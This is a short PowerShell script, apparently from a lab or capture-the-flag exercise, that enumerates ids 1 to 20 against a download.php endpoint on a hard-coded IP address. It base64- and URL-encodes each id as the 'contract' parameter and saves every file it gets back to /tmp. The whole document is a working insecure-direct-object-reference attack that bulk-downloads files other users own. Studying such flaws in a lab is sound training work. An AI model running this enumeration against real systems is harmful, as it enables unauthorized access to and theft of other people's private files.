$url = "http://94.237.54.214:34215/"

# loop thru uid 1 to 20
for ($i = 1; $i -le 20; $i++) {
    # convert the value to base64 without newlines
    $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($i))

    # url encode the base64 encoded string
    $urlEncoded = [System.Uri]::EscapeDataString($base64)
    # Write-Output $urlEncoded  # print debugging

    $response = Invoke-WebRequest -Uri "$url/download.php?contract=$urlEncoded" -Method GET 

    # extract filename from Content-Disposition header
    $filename = $response.Headers['Content-Disposition'] -replace 'attachment; filename="([^"]+)"', '$1'

    $outputPath = "/tmp/$filename"

    # download the file
    Invoke-WebRequest -Uri "$url/download.php?contract=$urlEncoded" -Outfile $outputPath
 }

